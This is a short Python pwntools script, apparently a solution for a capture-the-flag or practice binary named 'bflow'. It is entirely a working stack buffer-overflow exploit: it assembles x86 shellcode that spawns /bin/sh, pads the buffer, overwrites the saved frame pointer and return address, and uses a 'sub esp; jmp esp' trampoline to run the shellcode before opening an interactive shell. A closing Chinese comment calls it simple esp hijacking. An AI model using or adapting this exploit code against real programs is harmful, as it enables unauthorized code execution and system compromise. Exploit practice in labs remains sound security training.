from pwn import *
context(arch = 'i386', os = 'linux')
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"
success(len(shellcode_x86))
success(disasm(shellcode_x86))

sh = process('./bflow')

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
payload = shellcode_x86+(0x20-len(shellcode_x86))*"a"+"febp"+p32(0x08048504)+sub_esp_jmp

sh.sendline(payload)
sh.interactive()
#简单的劫持esp